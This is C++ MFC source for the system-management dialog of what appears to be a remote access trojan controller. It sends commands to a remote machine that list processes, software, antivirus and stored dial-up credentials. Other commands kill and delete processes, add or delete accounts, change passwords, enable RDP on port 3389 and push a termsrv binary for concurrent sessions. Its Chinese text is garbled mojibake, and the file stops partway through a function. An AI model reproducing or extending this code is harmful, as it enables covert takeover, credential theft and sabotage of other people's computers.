// SystemDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "SystemDlg.h"
#include "InputDlg.h"
#include "C_termsrv_t.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CSystemDlg dialog
CSystemDlg::CSystemDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
: CDialog(CSystemDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CSystemDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SYSTEM));

	m_bOnClose = FALSE;
	dwMem = dwCpu = dwPrs = 0;
	nRemotePort = 3389;
}


void CSystemDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSystemDlg)
	DDX_Control(pDX, IDC_LIST, m_list);
	DDX_Control(pDX, IDC_TAB, m_tab);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CSystemDlg, CDialog)
	//{{AFX_MSG_MAP(CSystemDlg)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB, OnSelchangeTab)
	ON_COMMAND(ID_MENUITEM_KILLPROCESS, OnMenuitemKillprocess)
	ON_COMMAND(ID_MENUITEM_REFRESH_SLIST, OnMenuitemRefreshSlist)
	ON_NOTIFY(NM_RCLICK, IDC_LIST, OnRclickList)
	ON_COMMAND(ID_MENUITEM_COPY, OnMenuitemCopy)
	ON_COMMAND(ID_MENUITEM_WINDOW_RESTORED, OnMenuitemWindowRestored)
	ON_COMMAND(ID_MENUITEM_WINDOW_HIDE, OnMenuitemWindowHide)
	ON_COMMAND(ID_MENUITEM_WINDOW_CLOSE, OnMenuitemWindowClose)
	ON_COMMAND(ID_MENUITEM_WINDOW_MAX, OnMenuitemWindowMax)
	ON_COMMAND(ID_MENUITEM_WINDOW_MIN, OnMenuitemWindowMin)
	ON_COMMAND(ID_MENUITEM_KILLANDDEL, OnMenuitemKillanddel)
	ON_WM_TIMER()
	ON_COMMAND(ID_MENUITEM_ACTIVE_USER, OnMenuitemActiveUser)
	ON_COMMAND(ID_MENUITEM_DISABLE_USER, OnMenuitemDisableUser)
	ON_COMMAND(ID_MENUITEM_ADD_USER, OnMenuitemAddUser)
	ON_COMMAND(ID_MENUITEM_CHANGE_PASS, OnMenuitemChangePass)
	ON_COMMAND(ID_MENUITEM_DEL_USER, OnMenuitemDelUser)
	ON_COMMAND(ID_MENUITEM_DISCONNECT_USER, OnMenuitemDisconnectUser)
	ON_COMMAND(ID_MENUITEM_LOGOFF_USER, OnMenuitemLogoffUser)
	ON_BN_CLICKED(IDC_BUTTON_MSTSC, OnButtonMstsc)
	ON_BN_CLICKED(IDC_BUTTON_CHANAGEPORT, OnButtonChanageport)
	ON_BN_CLICKED(IDC_BUTTON_OPEN3389, OnButtonOpen3389)
	ON_COMMAND(ID_MENUITEM_S_LOGOFF, OnMenuitemSLogoff)
	ON_COMMAND(ID_MENUITEM_S_REBOOT, OnMenuitemSReboot)
	ON_COMMAND(ID_MENUITEM_S_SHUTDOWN, OnMenuitemSShutdown)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSystemDlg message handlers
void CSystemDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_PSLIST:
		ShowProcessList();
		break;
	case TOKEN_WSLIST:
		ShowWindowsList();
		break;
	case TOKEN_DIALUPASS:
		ShowDialupassList();
		break;
	case TOKEN_SOFTWARE:
		ShowSoftWareList();
		break;
	case TOKEN_SSLIST:
		ShowSysInfoList();
		break;
	case TOKEN_USLIST:
		ShowSysUserList();
		break;
	case TOKEN_ASLIST:
		ShowUserStateList();
		break;
	case TOKEN_CPUMEMORY:
		{
			//////////////// MEM//////////////////////////////////////////////////////////
			memcpy((void*)&dwMem,m_pContext->m_DeCompressionBuffer.GetBuffer(1),sizeof(DWORD));
			//////////////// CPU//////////////////////////////////////////////////////////
			memcpy((void*)&dwCpu,m_pContext->m_DeCompressionBuffer.GetBuffer(1)+sizeof(DWORD),sizeof(DWORD));
		}
		break;
	case TOKEN_CHANGE_PSAA_SUCCESS:
		::MessageBox(m_hWnd,_T("�޸�����ɹ�!"),"��ʾ",MB_YESNO);
		break;
	case TOKEN_GET_TERMSRV:
		SendTermsrv_t();
		break;
	case TOKEN_TERMSRV_OK:
		::MessageBox(m_hWnd,_T("˫��3389�ɹ�!"),"��ʾ",MB_YESNO);
		break;
	default:
		// ���䷢���쳣����
		break;
	}
}

void CSystemDlg::SendTermsrv_t()
{
	if (MessageBox(_T("�˻���ΪXPϵͳ,�Ƿ�˫��3389?"), _T("��ʾ"), MB_YESNO | MB_ICONQUESTION) == IDNO)
		return;
	int	nPacketLength = 1 + termsrv_tMyFileSize;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	if (lpPacket == NULL)
		return;
	
	lpPacket[0] = COMMAND_SEND_TERMSRV;
	memcpy(lpPacket + 1,  termsrv_tMyFileBuf, termsrv_tMyFileSize);
	
	m_iocpServer->Send(m_pContext,lpPacket,nPacketLength);
}

static UINT indicators[] =
{
	ID_SEPARATOR,           // status line indicator
		ID_SEPARATOR,           // status line indicator
		ID_SEPARATOR,           // status line indicator
		ID_SEPARATOR,           // status line indicator
};
BOOL CSystemDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	str.Format("ϵͳ����\\\\%s", IPAddress);
	SetWindowText(str);

	m_tab.InsertItem(0, "����");
	m_tab.InsertItem(1, "����");

	m_tab.InsertItem(2, "ϵͳ��Ϣ");
	m_tab.InsertItem(3, "��������");
	m_tab.InsertItem(4, "���");

	m_tab.InsertItem(5, "ϵͳ�û�");
	m_tab.InsertItem(6, "�����û�");

	m_tab.SetTheme(xtpControlThemeUltraFlat);

	HWND hWndHeader =m_list.GetDlgItem(0)->GetSafeHwnd();// m_pListCtrl->GetDlgItem(0)->GetSafeHwnd();
	m_header.SubclassWindow(hWndHeader);

	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}
	
	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_NORMAL, 100);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 130);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 150);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_STRETCH, NULL);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //��ʾ״̬��	

	SetTimer(1, 3000, NULL);  //������ʱ�� 1
	SetDlgItemText(IDC_EDIT_PORT,"3389");

	AdjustList();
    ShowProcessList();
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CSystemDlg::AdjustList()
{
	// ״̬����û�д���
	if (m_wndStatusBar.m_hWnd == NULL)
		return;
	// ��λ״̬��
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //��ʾ������

	RECT	rectClient;
	RECT	rectList;
	RECT	rectTab;
	GetClientRect(&rectClient);
	rectList.left = 20;
	rectList.top = 35;
	rectList.right = rectClient.right - 20;
	rectList.bottom = rectClient.bottom - 70;

	rectTab.left = 5;
	rectTab.top = 0;
	rectTab.right = rectClient.right - 5;
	rectTab.bottom = rectClient.bottom - 25;
	
	m_tab.MoveWindow(&rectTab);
	m_list.MoveWindow(&rectList);
}

CString __MakePriority(DWORD dwPriClass)
{
	CString strRet;
	switch(dwPriClass)
	{
	case REALTIME_PRIORITY_CLASS:
		strRet = "ʵʱ";
		break;
	case HIGH_PRIORITY_CLASS:
		strRet = "��";
		break;
	case ABOVE_NORMAL_PRIORITY_CLASS:
		strRet = "���ڱ�׼";
		break;
	case NORMAL_PRIORITY_CLASS:
		strRet = "��׼";
		break;
	case BELOW_NORMAL_PRIORITY_CLASS:
		strRet = "���ڱ�׼";
		break;
	case IDLE_PRIORITY_CLASS:
		strRet = "����";
		break;
	default:
		strRet = "δ֪";
		break;
	}
	
	return strRet;
}

void CSystemDlg::ShowProcessList()
{
	DeleteList();
	m_list.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list.InsertColumn(0, "ӳ������", LVCFMT_LEFT, 100);
	m_list.InsertColumn(1, "PID", LVCFMT_LEFT, 50);
	m_list.InsertColumn(2, "����·��", LVCFMT_LEFT, 230);
	m_list.InsertColumn(3, "���ȼ�", LVCFMT_LEFT, 50);
	m_list.InsertColumn(4, "�߳���", LVCFMT_LEFT, 50);
	m_list.InsertColumn(5, "�û���", LVCFMT_LEFT, 70);
	m_list.InsertColumn(6, "�ڴ�", LVCFMT_LEFT, 70);
	m_list.InsertColumn(7, "�ļ���С", LVCFMT_LEFT, 80);

	char	*lpBuffer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	char	*strExeFile;
	char	*strProcessName;
	char    *strTemp; 
	DWORD	dwOffset = 0;
	CString str;
	char	*strProcessUser;

	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		strExeFile = lpBuffer + dwOffset + sizeof(DWORD);
		strProcessName = strExeFile + lstrlen(strExeFile) + 1;
		strTemp = strProcessName + lstrlen(strProcessName)+1;
		LPDWORD	lpdwPriClass = LPDWORD(strTemp);
		LPDWORD	lpdwThreads = LPDWORD(strTemp + sizeof(DWORD));
		strProcessUser = strTemp + sizeof(DWORD)*2;
		LPDWORD	lpdwWorkingSetSize = LPDWORD(strProcessUser + lstrlen(strProcessUser)+1);

		LPDWORD	lpdwFileSize = LPDWORD(strProcessUser + lstrlen(strProcessUser)+1 + sizeof(DWORD));
 
		m_list.InsertItem(i, strExeFile,2);
		str.Format("%5u", *lpPID);
		m_list.SetItemText(i, 1, str);
 
		m_list.SetItemText(i, 2, strProcessName);
 
		m_list.SetItemText(i, 3,__MakePriority(*lpdwPriClass));

		str.Format("%5u", *lpdwThreads);
		m_list.SetItemText(i, 4, str);

		m_list.SetItemText(i, 5, strProcessUser);

		str.Format("%5u K",*lpdwWorkingSetSize);
		m_list.SetItemText(i, 6 , str); 

		str.Format("%5u KB",*lpdwFileSize);
		m_list.SetItemText(i, 7 , str); 

		// ItemData Ϊ����ID
		m_list.SetItemData(i, *lpPID);
		dwOffset += sizeof(DWORD)*5 + lstrlen(strExeFile) + lstrlen(strProcessName) + lstrlen(strProcessUser) + 3;
	}
	
	dwPrs = i;
	str.Format("����·�� / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list.SetColumn(2, &lvc);
}

BOOL CSystemDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if ( pMsg->message == WM_KEYDOWN && pMsg->wParam  == VK_F5)
	{
		OnMenuitemRefreshSlist();
		return TRUE;
	}
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CSystemDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	closesocket(m_pContext->m_Socket);

	m_bOnClose = TRUE;
	CDialog::OnClose();
}

void CSystemDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	if(!m_bOnClose)
		OnClose();

	delete this;
	CDialog::PostNcDestroy();
}

void CSystemDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);

	if (!IsWindowVisible())
		return;
	// TODO: Add your message handler code here
	AdjustList();
}


void CSystemDlg::OnSelchangeTab(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	ShowSelectWindow();
	*pResult = 0;
}

void CSystemDlg::DeleteList()
{
	m_list.DeleteAllItems();	
	int nColumnCount= m_list.GetHeaderCtrl()->GetItemCount();
	
	for(int n=0;n<nColumnCount;n++)
	{
		m_list.DeleteColumn(0);
	}
}


void CSystemDlg::ShowSelectWindow()
{
	DeleteList();
	switch (m_tab.GetCurSel())
	{
	case 0:
		GetProcessList();
		break;
	case 1:
		GetWindowsList();
		break;
	case 2:
		GetSysInfoList();
		break;
	case 3:
		GetDialupassList();
		break;
	case 4:
		GetSoftWareList();
		break;
	case 5:
		GetSysUserList();
		break;
	case 6:
		GetUserStateList();
		break;
	default:
		break;
	}
}

void CSystemDlg::GetProcessList()
{
	BYTE bToken = COMMAND_PSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetWindowsList()
{
	BYTE bToken = COMMAND_WSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetSoftWareList()
{
	BYTE bToken = COMMAND_SOFTWARELIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetSysUserList()
{
	BYTE bToken = COMMAND_USLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);	
}
void CSystemDlg::GetSysInfoList()
{
	BYTE bToken = COMMAND_SSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}
void CSystemDlg::GetUserStateList()
{
	BYTE bToken = COMMAND_ASLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);	
}

void CSystemDlg::GetDialupassList()
{
	DeleteList();
	m_list.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list.InsertColumn(0, "����", LVCFMT_LEFT, 70);
	m_list.InsertColumn(1, "�û�", LVCFMT_LEFT, 85);
	m_list.InsertColumn(2, "����", LVCFMT_LEFT, 75);
	m_list.InsertColumn(3, "�绰/����", LVCFMT_LEFT, 80);
	m_list.InsertColumn(5, "�豸", LVCFMT_LEFT, 130);

	BYTE bToken = COMMAND_DSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::ShowSoftWareList()
{
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;

	DeleteList();
	m_list.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list.InsertColumn(0, "�������", LVCFMT_LEFT, 130);
	m_list.InsertColumn(1, "������", LVCFMT_LEFT, 85);
	m_list.InsertColumn(2, "�汾", LVCFMT_LEFT, 75);
	m_list.InsertColumn(3, "��װʱ��", LVCFMT_LEFT, 80);
	m_list.InsertColumn(4, "ж���������", LVCFMT_LEFT, 300);


	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 5; j++)
		{
			char *lpString = (char *)lpBuffer + dwOffset;

			if (j == 0)
				m_list.InsertItem(i, lpString);
			else
				m_list.SetItemText(i, j, lpString);
			
			dwOffset += lstrlen(lpString) + 1;
		}
	}
}

void CSystemDlg::ShowDialupassList()
{
	if(2 != m_tab.GetCurSel())
		return;
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;

	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 6; j++)
		{
			char *lpString = (char *)lpBuffer + dwOffset;
			if (j > 0)
			{
				if (j == 1)
					m_list.InsertItem(i, lpString);
				else
					m_list.SetItemText(i, j - 1, lpString);
			}
			dwOffset += lstrlen(lpString) + 1;
		}
	}
}

void CSystemDlg::ShowWindowsList()
{
	DeleteList();
	m_list.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list.InsertColumn(0, "PID", LVCFMT_LEFT, 75);
	m_list.InsertColumn(1, "���", LVCFMT_LEFT, 70);
	m_list.InsertColumn(2, "��������", LVCFMT_LEFT, 250);
	m_list.InsertColumn(3, "����״̬", LVCFMT_LEFT, 70);

	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	char	*lpTitle = NULL;
	CString	str;
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		LPDWORD	hwnd = LPDWORD(lpBuffer + dwOffset + sizeof(DWORD));
		lpTitle = (char *)lpBuffer + dwOffset + sizeof(DWORD)*2;
		str.Format("%5u", *lpPID);
		m_list.InsertItem(i, str,25);
		str.Format("%5u", *hwnd);
		m_list.SetItemText(i, 1,str);
		m_list.SetItemText(i, 2, lpTitle);
		m_list.SetItemText(i, 3,"��ʾ");
		// ItemData Ϊ����ID
		m_list.SetItemData(i, *lpPID);
		dwOffset += sizeof(DWORD)*2 + lstrlen(lpTitle) + 1;
	}
	str.Format("�������� / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list.SetColumn(2, &lvc);
}

void CSystemDlg::OnMenuitemRefreshSlist() 
{
	// TODO: Add your command handler code here
	ShowSelectWindow();
}

void CSystemDlg::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	CMenu	popup;
	popup.LoadMenu(IDR_MENU_SLIST);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);

	int a1[12] = {4,5,6,7,8,9,10,11,12,13,14,15};
	int a2[7] =  {9,10,11,12,13,14,15};
	int a3[14] = {2,3,4,5,6,7,8,9,10,11,12,13,14,15};
	int a4[9] =  {2,3,4,5,6,7,8,14,15};
	int a5[12] = {2,3,4,5,6,7,8,9,10,11,12,13};

	switch(m_tab.GetCurSel())
	{
	case 0:
		{
			for (int i = 12 ; i> 0;i--)
			{
				pM->DeleteMenu(a1[i-1], MF_BYPOSITION);
			}
		}
		break;
	case 1:
		{
			for (int i = 7 ; i> 0;i--)
			{
				pM->DeleteMenu(a2[i-1], MF_BYPOSITION);
			}
		}
		break;
	case 2:
	case 3:
	case 4:
		{
			for (int i = 14 ; i> 0;i--)
			{
				pM->DeleteMenu(a3[i-1], MF_BYPOSITION);
			}
		}
    	break;
	case 5:
		{
			for (int i = 9 ; i> 0;i--)
			{
				pM->DeleteMenu(a4[i-1], MF_BYPOSITION);
			}
		}
		break;
	case 6:
		{
			for (int i = 12 ; i> 0;i--)
			{
				pM->DeleteMenu(a5[i-1], MF_BYPOSITION);
			}
		}
		break;
	default:
		break;
	}

	CXTPCommandBars::TrackPopupMenu(pM, 0, p.x, p.y, this);

	*pResult = 0;
}

void CSystemDlg::SetClipboardText(CString &Data)
{
	if(::OpenClipboard(NULL) == 0)
		return;
	EmptyClipboard();
	HGLOBAL htext = GlobalAlloc(GHND, Data.GetLength() + 1);
	if(htext != 0)
	{
		CopyMemory(GlobalLock(htext), Data.GetBuffer(0), Data.GetLength());
		GlobalUnlock(htext);
		SetClipboardData(1, (HANDLE)htext);
		GlobalFree(htext);
	}
	CloseClipboard();
}

void CSystemDlg::OnMenuitemCopy() 
{
	// TODO: Add your command handler code here
	if (m_list.GetSelectedCount() < 1)
	{
		return ;	
	}
	POSITION pos = m_list.GetFirstSelectedItemPosition();
	CString Data;
	CString temp;
	while(pos)
	{
		temp = "";
		int	nItem = m_list.GetNextSelectedItem(pos);
		for(int i = 0; i < m_list.GetHeaderCtrl()-> GetItemCount(); i++)
		{
			temp += m_list.GetItemText(nItem, i);
			temp += "	";
		}
		Data += temp;
		Data += "\r\n";
	}
	SetClipboardText(Data);
	MessageBox("�Ѹ������ݵ����а�");
}



void CSystemDlg::OnMenuitemWindowRestored() 
{
	// TODO: Add your command handler code here
	BYTE lpMsgBuf[20];
	int	nItem = m_list.GetSelectionMark();
	if (nItem >=0 )
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_TEST;
		DWORD hwnd = atoi(m_list.GetItemText(nItem, 1));

		m_list.SetItemText(nItem,3,"��ʾ");
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		DWORD dHow=SW_RESTORE;
		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	
	}
}

void CSystemDlg::OnMenuitemWindowHide() 
{
	// TODO: Add your command handler code here
	BYTE lpMsgBuf[20];
	int	nItem = m_list.GetSelectionMark();
	if (nItem >=0 )
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_TEST;
		DWORD hwnd = atoi(m_list.GetItemText(nItem, 1));
		
		m_list.SetItemText(nItem,3,"����");
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		DWORD dHow=SW_HIDE;
		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	
	}
}

void CSystemDlg::OnMenuitemWindowClose() 
{
	// TODO: Add your command handler code here
	BYTE lpMsgBuf[20];
	int	nItem = m_list.GetSelectionMark();
	if (nItem >=0 )
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_CLOSE;
		DWORD hwnd = atoi(m_list.GetItemText(nItem, 1));
	
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	
	}
}

void CSystemDlg::OnMenuitemWindowMax() 
{
	// TODO: Add your command handler code here
	BYTE lpMsgBuf[20];
	int	nItem = m_list.GetSelectionMark();
	if (nItem >=0 )
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_TEST;
		DWORD hwnd = atoi(m_list.GetItemText(nItem, 1));
		
		m_list.SetItemText(nItem,3,"��ʾ");
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		DWORD dHow=SW_MAXIMIZE;
		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	
	}
}

void CSystemDlg::OnMenuitemWindowMin() 
{
	// TODO: Add your command handler code here
	BYTE lpMsgBuf[20];
	int	nItem = m_list.GetSelectionMark();
	if (nItem >=0 )
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_TEST;
		DWORD hwnd = atoi(m_list.GetItemText(nItem, 1));
		
		m_list.SetItemText(nItem,3,"��ʾ");
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		DWORD dHow=SW_MINIMIZE;
		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	
	}
}

void CSystemDlg::OnMenuitemKillanddel() 
{
	// TODO: Add your command handler code here
	OnMenuitemKillprocesss(TRUE);
}
void CSystemDlg::OnMenuitemKillprocess() 
{
	// TODO: Add your command handler code here
	OnMenuitemKillprocesss(TRUE);
}

void CSystemDlg::OnMenuitemKillprocesss(BOOL bNeedDel = FALSE) 
{
	// TODO: Add your command handler code here
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 2 + (m_list.GetSelectedCount() * 4));
	if (m_tab.GetCurSel() == 0 )
	{
		lpBuffer[0] = COMMAND_KILLPROCESS;
	}
	else
	{
		lpBuffer[0] = COMMAND_KILLPROCESS_WINDOW;
	}

	CString strText;
	if(bNeedDel == TRUE)
	{
		strText = "��ɾ��";
		lpBuffer[1] = 1;
	}
	else
	{
		strText = "";
		lpBuffer[1] = 0;
	}
	
	char *lpTips = "����: ��ֹ���̻ᵼ�²�ϣ�������Ľ����\n"
		"�������ݶ�ʧ��ϵͳ���ȶ����ڱ���ֹǰ��\n"
		"���̽�û�л��ᱣ����״̬�����ݡ�";
	CString str;
	if (m_list.GetSelectedCount() > 1)
	{
		str.Format("%sȷʵ\n����ֹ%s��%d�������?", lpTips, strText,m_list.GetSelectedCount());	
	}
	else
	{
		str.Format("%sȷʵ\n����ֹ%s���������?", lpTips,strText);
	}
	if (::MessageBox(m_hWnd, str, "���̽�������", MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;
	
	DWORD	dwOffset = 2;
	POSITION pos = m_list.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_list.GetNextSelectedItem(pos);
		DWORD dwProcessID = m_list.GetItemData(nItem);
		memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
		dwOffset += sizeof(DWORD);
	}
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}


void CSystemDlg::ShowSysInfoList()
{
	DeleteList();
	m_list.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list.InsertColumn(0, "����", LVCFMT_LEFT, 100);
	m_list.InsertColumn(1, "��Ϣ", LVCFMT_LEFT, 300);
	
	tagSystemInfo m_SysInfo;
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	memcpy(&m_SysInfo, lpBuffer , sizeof(tagSystemInfo));
	
	CString str;
	m_list.InsertItem(0, _T("����IP") , 0);
	m_list.InsertItem(1, _T("CPU��Ϣ"), 1);
	m_list.InsertItem(2, _T("�ڴ��С"),2);
	m_list.InsertItem(3, _T("Ӳ�̴�С"),3);
	m_list.InsertItem(4, _T("�������"),4);
	m_list.InsertItem(5, _T("��ǰ�û�"),4);
	m_list.InsertItem(6, _T("�ʱ��"),5);
	m_list.InsertItem(7, _T("��ȫ���"),6);
	m_list.InsertItem(8, _T("Զ�̶˿�"),7);
	m_list.InsertItem(9, _T("�Ƿ�˫��"),8);
	m_list.InsertItem(10, _T("��Ļ�ֱ���"),9);
	m_list.InsertItem(11, _T("�����λ��"),10);
	
	m_list.SetItemText(0, 1, IPAddress);
	m_list.SetItemText(1, 1, m_SysInfo.szCpuInfo);
	str.Format("�������ڴ�:%d MB , δʹ�������ڴ�:%d MB",m_SysInfo.szMemory,m_SysInfo.szMemoryFree);	
	m_list.SetItemText(2, 1, str);
	str.Format("Ӳ��������:%ld GB , ʣ������:%ld GB",m_SysInfo.szDriveSize,m_SysInfo.szDriveFreeSize);
	m_list.SetItemText(3, 1, str);
	m_list.SetItemText(4, 1, m_SysInfo.szPcName);
	m_list.SetItemText(5, 1, m_SysInfo.szUserName);
	m_list.SetItemText(6, 1, m_SysInfo.szActiveTime);
	m_list.SetItemText(7, 1, m_SysInfo.szAntiVirus);
	m_list.SetItemText(8, 1, m_SysInfo.szRemotePort);
	m_list.SetItemText(9, 1, m_SysInfo.szOpenInfo);
	m_list.SetItemText(10, 1, m_SysInfo.szScrxy);
	m_list.SetItemText(11, 1, m_SysInfo.szDLLPath);

	nRemotePort = atoi(m_SysInfo.szRemotePort);

}

void CSystemDlg::ShowSysUserList()
{
	DeleteList();
	m_list.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list.InsertColumn(0, "�û���", LVCFMT_LEFT, 150);
	m_list.InsertColumn(1, "�û���", LVCFMT_LEFT, 150);
	m_list.InsertColumn(2, "״̬", LVCFMT_LEFT, 80);
	
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	
	CString	str;
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		str =  (char*)lpBuffer + dwOffset;
		m_list.InsertItem(i, str);
		dwOffset += str.GetLength()+1;
		str =  (char*)lpBuffer + dwOffset;
		dwOffset += str.GetLength()+1;
		m_list.SetItemText(i, 1, str);
		str =  (char*)lpBuffer + dwOffset;
		dwOffset += str.GetLength()+1;
		m_list.SetItemText(i, 2, str);
	}
}

void CSystemDlg::ShowUserStateList()
{
	DeleteList();

	m_list.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list.InsertColumn(0, "�û�", LVCFMT_LEFT, 100);
	m_list.InsertColumn(1, "��ʶ", LVCFMT_LEFT, 40);
	m_list.InsertColumn(2, "״̬", LVCFMT_LEFT, 100);
	m_list.InsertColumn(3, "�Ự", LVCFMT_LEFT, 70);
